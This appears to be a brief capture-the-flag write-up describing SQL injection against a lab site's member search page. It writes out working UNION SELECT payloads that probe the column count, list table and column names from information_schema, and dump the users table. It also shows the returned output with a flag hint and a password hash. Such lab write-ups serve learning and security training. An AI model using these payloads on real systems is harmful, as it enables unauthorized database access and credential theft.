in the search members page, we have tried the generic union select payloads from this link https://github.com/payloadbox/sql-injection-payload-list
using this input "5 UNION ALL SELECT 1" we had incorrect number of columns message, so we have tried this "5 UNION ALL SELECT 1,2"
we used the information schema and the cancatanate cmd following this input 5 UNION SELECT 1, CONCAT(table_name,1000001,column_name) FROM information_schema.columns, we found table called users, and it has (username,password,user_id,first_name,last_name,town, country,planet), using this command to get all values....5 UNION SELECT 1, CONCAT(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users, this has been shown

ID: 5 UNION SELECT 1, CONCAT(user_id,first_name,last_name,town,country,planet,Commentaire,countersign) from users 
First name: 1
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it is good !5ff9d0165b4f92b14994e5c685cdce28